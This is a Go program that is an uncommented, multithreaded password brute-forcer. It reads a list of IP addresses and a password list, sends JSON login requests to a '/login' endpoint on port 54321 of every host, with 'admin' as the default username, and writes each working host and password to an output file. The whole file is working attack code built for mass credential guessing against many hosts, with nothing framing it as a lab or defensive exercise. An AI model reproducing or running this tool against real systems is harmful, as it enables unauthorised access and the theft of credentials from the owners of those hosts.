package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)

var goods []string
var mu sync.Mutex

func checkHost(username string,host string, payloads []string, outputFileName string, wg *sync.WaitGroup) {
	defer wg.Done()
	if username == ""{
		username = "admin"
	}
	for _, passw := range payloads {
		url := "http://" + strings.TrimSpace(host) + ":54321/login"
		data := map[string]string{"username": username, "password": passw}
		jsonData, _ := json.Marshal(data)

		resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("error:", err)
			continue
		}
		defer resp.Body.Close()

		body, _ := ioutil.ReadAll(resp.Body)
		var result map[string]interface{}
		json.Unmarshal(body, &result)

		if success, ok := result["success"].(bool); ok && success {
			mu.Lock()
			goods = append(goods, host)
			mu.Unlock()

			file, err := os.OpenFile(outputFileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println("error:", err)
				continue
			}
			defer file.Close()

			file.WriteString(strings.TrimSpace(host) + "@" + passw + "\n")
		}
	}
}

func main() {
	var payloadsFile, username, ipsFile, outputFile string
	var numThreads int

	flag.StringVar(&payloadsFile, "p", "", "Path to the payloads file")
	flag.StringVar(&ipsFile, "i", "", "Path to the ips file")
	flag.StringVar(&outputFile, "o", "", "Path to the output file")
	flag.StringVar(&username, "u", "", "Username")
	flag.IntVar(&numThreads, "t", 1, "Number of threads")
	flag.Parse()

	if payloadsFile == "" || ipsFile == "" || outputFile == "" {
		fmt.Println("Usage: o -p <payloadsFile> -i <ipsFile> -o <outputFile> -u <Username[default=admin]> -t <numThreads[default=1]>")
		os.Exit(1)
	}

	payloadsData, err := ioutil.ReadFile(payloadsFile)
	if err != nil {
		fmt.Println("error:", err)
		os.Exit(1)
	}
	payloads := strings.Split(string(payloadsData), "\n")

	ipsData, err := ioutil.ReadFile(ipsFile)
	if err != nil {
		fmt.Println("error:", err)
		os.Exit(1)
	}
	ips := strings.Split(string(ipsData), "\n")

	var wg sync.WaitGroup

	for _, ip := range ips {
		for i := 0; i < numThreads; i++ {
			wg.Add(1)
			go checkHost(username,ip, payloads, outputFile, &wg)
		}
	}

	wg.Wait()
}
